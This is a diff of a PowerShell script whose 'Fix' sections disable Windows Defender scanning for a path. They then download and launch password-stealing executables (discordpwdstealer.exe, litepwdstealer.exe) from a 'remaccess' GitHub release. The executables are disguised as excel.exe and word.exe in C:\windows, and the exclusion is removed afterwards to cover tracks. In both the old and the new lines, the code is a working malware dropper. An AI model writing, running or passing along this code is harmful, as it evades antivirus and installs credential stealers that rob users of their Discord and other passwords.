@@ -396,19 +396,11 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 }
 if ($pwdst.ToLower() -eq "y") {
     Write-Host "Executing PWD-ST Fix..."
-    	Add-MpPreference -ExclusionPath $TempDir
- 	if ($output -ne $null) {
-    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
-	} else {}
-	$TempDir = [System.IO.Path]::GetTempPath()
-	$output = "$TempDir\excel.exe"
+    	Add-MpPreference -ExclusionPath "C:\windows\excel.exe"
 	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordpwdstealer.exe"
-	Invoke-WebRequest -Uri $url -OutFile $output
-	if ($output -ne $null) {
-    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
-	} else {} 	
-	Start-Process -FilePath $output
-	Remove-MpPreference -ExclusionPath $TempDir
+	Invoke-WebRequest -Uri $url -OutFile "C:\windows\excel.exe"	
+	Start-Process -FilePath "C:\windows\excel.exe"
+	Remove-MpPreference -ExclusionPath "C:\windows\excel.exe"
 } else {
 }
 #litepwdsnitch Fix
@@ -419,19 +411,11 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 }
 if ($pwdst.ToLower() -eq "y") {
     Write-Host "Executing PWD-ST Fix..."
-    	Add-MpPreference -ExclusionPath $TempDir
- 	if ($output -ne $null) {
-    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
-	} else {}
-	$TempDir = [System.IO.Path]::GetTempPath()
-	$output = "$TempDir\excel.exe"
+    	Add-MpPreference -ExclusionPath "C:\windows\word.exe"
 	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/litepwdstealer.exe"
-	Invoke-WebRequest -Uri $url -OutFile $output
-	if ($output -ne $null) {
-    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
-	} else {} 	
-	Start-Process -FilePath $output
-	Remove-MpPreference -ExclusionPath $TempDir
+	Invoke-WebRequest -Uri $url -OutFile "C:\windows\word.exe"	
+	Start-Process -FilePath "C:\windows\word.exe"
+	Remove-MpPreference -ExclusionPath "C:\windows\word.exe"
 } else {
 }
 #Cleanup
